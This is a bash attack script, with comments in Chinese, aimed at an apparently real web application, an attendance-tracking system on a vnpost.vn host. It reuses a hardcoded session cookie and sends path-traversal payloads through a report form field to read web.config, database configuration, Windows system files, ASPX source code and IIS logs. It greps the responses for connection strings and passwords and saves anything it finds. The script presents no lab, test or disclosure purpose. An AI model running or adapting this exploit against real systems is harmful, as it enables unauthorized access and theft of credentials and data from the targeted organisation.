#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🎯 新攻击：路径遍历读取敏感文件"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "策略：虽然不能写入文件，但可能可以读取现有文件"
echo "通过导入/打开功能读取敏感文件内容"
echo ""

# 获取ViewState
page=$(curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" -H "Cookie: $COOKIE" 2>&1)
VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
VG=$(echo "$page" | grep -oE '__VIEWSTATEGENERATOR" value="[^"]+' | cut -d'"' -f3)
EV=$(echo "$page" | grep -oE '__EVENTVALIDATION" value="[^"]+' | cut -d'"' -f3)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo "[测试1] 尝试读取web.config（最高价值）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

WEB_CONFIG_PATHS=(
    "../../web.config"
    "../../../inetpub/wwwroot/chamcong/web.config"
    "C:/inetpub/wwwroot/chamcong/web.config"
    "web.config"
)

for path in "${WEB_CONFIG_PATHS[@]}"; do
    echo ""
    echo "  尝试: $path"
    
    # 尝试通过txtThang读取
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${path}" \
        --data-urlencode "txtNam=" \
        --data-urlencode "btnExport=Export" \
        -o "read_webconfig_$(echo $path | md5sum | cut -d' ' -f1).html" 2>&1
    
    result_file="read_webconfig_$(echo $path | md5sum | cut -d' ' -f1).html"
    size=$(wc -c < "$result_file")
    echo "    响应: $size bytes"
    
    # 检查是否读取成功
    if grep -qi "<configuration>\|<connectionStrings>\|<appSettings>" "$result_file"; then
        echo "    🔥🔥🔥🔥🔥 成功读取web.config！"
        echo ""
        echo "    内容:"
        grep -A 10 -i "connectionString\|appSettings\|password" "$result_file" | head -30
        
        # 保存完整内容
        echo "    完整内容已保存到: webconfig_found.txt"
        cat "$result_file" > webconfig_found.txt
    elif grep -qi "access.*denied\|permission" "$result_file"; then
        echo "    ⚠️  权限拒绝（文件存在！）"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试2] 读取数据库配置文件"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

DB_CONFIG_PATHS=(
    "App_Data/database.config"
    "../../App_Data/database.config"
    "../../../inetpub/wwwroot/chamcong/App_Data/database.config"
)

for path in "${DB_CONFIG_PATHS[@]}"; do
    echo ""
    echo "  尝试: $path"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${path}" \
        --data-urlencode "txtNam=" \
        --data-urlencode "btnExport=Export" \
        -o "read_db_$(echo $path | md5sum | cut -d' ' -f1).html" 2>&1
    
    result_file="read_db_$(echo $path | md5sum | cut -d' ' -f1).html"
    size=$(wc -c < "$result_file")
    
    if grep -qi "server\|database\|password\|connection" "$result_file"; then
        echo "    🔥🔥🔥 发现数据库配置！"
        grep -i "server\|database\|password" "$result_file" | head -10
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试3] 尝试读取系统文件（探测环境）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

SYSTEM_FILES=(
    "C:/Windows/win.ini"
    "C:/Windows/System32/drivers/etc/hosts"
    "../../../Windows/win.ini"
)

for path in "${SYSTEM_FILES[@]}"; do
    echo ""
    echo "  尝试: $path"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${path}" \
        --data-urlencode "txtNam=" \
        --data-urlencode "btnExport=Export" \
        -o "read_sys_$(echo $path | md5sum | cut -d' ' -f1).html" 2>&1
    
    result_file="read_sys_$(echo $path | md5sum | cut -d' ' -f1).html"
    
    # 检查win.ini特征
    if grep -qi "\[fonts\]\|\[extensions\]\|for 16-bit app" "$result_file"; then
        echo "    🔥🔥🔥 成功读取win.ini！"
        grep -A 5 "\[fonts\]\|\[extensions\]" "$result_file"
    elif grep -qi "127.0.0.1\|localhost" "$result_file"; then
        echo "    🔥🔥🔥 成功读取hosts文件！"
        grep "127\|192\|10\." "$result_file" | head -20
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试4] 尝试读取应用源码"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

SOURCE_FILES=(
    "login.aspx"
    "../../login.aspx"
    "../../../inetpub/wwwroot/chamcong/login.aspx"
    "report/inBCC.aspx"
    "../../report/inBCC.aspx"
)

for path in "${SOURCE_FILES[@]}"; do
    echo ""
    echo "  尝试: $path"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${path}" \
        --data-urlencode "txtNam=" \
        --data-urlencode "btnExport=Export" \
        -o "read_source_$(echo $path | md5sum | cut -d' ' -f1).html" 2>&1
    
    result_file="read_source_$(echo $path | md5sum | cut -d' ' -f1).html"
    size=$(wc -c < "$result_file")
    
    if [ $size -gt 10000 ]; then
        echo "    🔥 响应很大: $size bytes（可能读取到源码）"
        
        # 检查ASPX标记
        if grep -qi "<%@\|<asp:\|runat.*server" "$result_file"; then
            echo "    🔥🔥🔥 成功读取ASPX源码！"
            grep -A 3 "<%@\|<asp:" "$result_file" | head -20
        fi
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[测试5] 尝试读取日志文件（可能包含敏感信息）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

LOG_PATHS=(
    "C:/inetpub/logs/LogFiles/W3SVC1/u_ex$(date +%y%m%d).log"
    "App_Data/logs/error.log"
    "../logs/application.log"
)

for path in "${LOG_PATHS[@]}"; do
    echo ""
    echo "  尝试: $path"
    
    curl -sk "${BASE}/report/inBCC.aspx?ID=BC01" \
        -X POST \
        -H "Cookie: $COOKIE" \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "__VIEWSTATEGENERATOR=$VG" \
        --data-urlencode "__EVENTVALIDATION=$EV" \
        --data-urlencode "txtThang=${path}" \
        --data-urlencode "txtNam=" \
        --data-urlencode "btnExport=Export" \
        -o "read_log_$(echo $path | md5sum | cut -d' ' -f1).html" 2>&1
    
    result_file="read_log_$(echo $path | md5sum | cut -d' ' -f1).html"
    size=$(wc -c < "$result_file")
    
    if [ $size -gt 10000 ]; then
        echo "    🔥 发现大型日志文件: $size bytes"
    fi
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 文件读取测试完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

echo ""
echo "📊 总结:"
echo "  - 测试了web.config读取"
echo "  - 测试了数据库配置读取"
echo "  - 测试了系统文件读取"
echo "  - 测试了源码读取"
echo "  - 测试了日志文件读取"
echo ""

# 检查是否有成功读取的文件
echo "成功读取的文件:"
if [ -f "webconfig_found.txt" ]; then
    echo "  🔥🔥🔥 web.config"
fi

for file in read_*.html; do
    if [ -f "$file" ]; then
        size=$(wc -c < "$file")
        if [ $size -gt 15000 ]; then
            echo "  🔥 $file: $size bytes（可能包含有用信息）"
        fi
    fi
done
